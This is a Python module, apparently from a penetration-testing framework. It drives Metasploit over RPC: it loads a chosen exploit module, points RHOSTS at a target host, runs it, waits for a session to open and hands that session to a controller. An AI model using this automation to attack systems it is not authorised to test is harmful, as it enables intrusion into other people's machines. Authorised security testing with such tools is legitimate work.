import time

import fontawesome as fa

from common.deps.pymetasploit3 import msfrpc
from common.deps.pymetasploit3.msfrpc import MsfError, PayloadModule, ExploitModule
from common.util import run_module_with_output
from modules.System.Controller import Controller


def Exploit(app, selection, host):
    cid = app.rpc["Client"].consoles.console().cid
    console = app.rpc["Client"].consoles.console(cid)

    print(fa.icons["arrow-right"] + " " + selection['name'], selection['fullname'], selection['rank'],
          selection['disclosuredate'])

    fullname = selection['fullname'].split("/")
    kind = fullname[0]
    expl = "/".join(fullname[1:])
    exploit: ExploitModule = app.rpc["Client"].modules.use(kind, expl)
    exploit.check()
    print(fa.icons["spinner"] + " Running " + kind + expl)
    Execute(app, exploit, target=host)


def Execute(app, exploit, target):
    baseline = len(app.rpc["Client"].sessions.list)

    runoptions = {}
    if 'RHOSTS' in exploit.missing_required:
        runoptions['RHOSTS'] = target['address']
        print(runoptions['RHOSTS'])

    console = app.rpc["Client"].consoles.console()
    cid = console.cid
    time.sleep(1)

    out, lastline = run_module_with_output(console, exploit, app=app, runoptions=runoptions)
    if app.debug:
        print(out)


    while len(app.rpc["Client"].sessions.list) == baseline:
        console.write("sessions -l")
        msfcontents = console.read()
        print(msfcontents)
        time.sleep(1)

    if lastline:
        sid = (lastline.split("[*] Session ")[1].split(" ")[0])
        try:
            sid = int(sid)
        except ValueError:
            app.error("Could not identify session")
            return

        print(f"{fa.icons['check']} Session {sid} Opened")
        if target['address'] not in app.exploits:
            app.exploits[target['address']] = {}
            app.exploits[target['address']][sid] = [exploit.fullname, True]
            if sid in app.exploits[target['address']]:
                print(fa.icons["exclamation-triangle"] + " Overwriting ", sid)

        input("Press enter to continue...")
        Controller(app, exploited=target['address'], sid=sid)
    return app
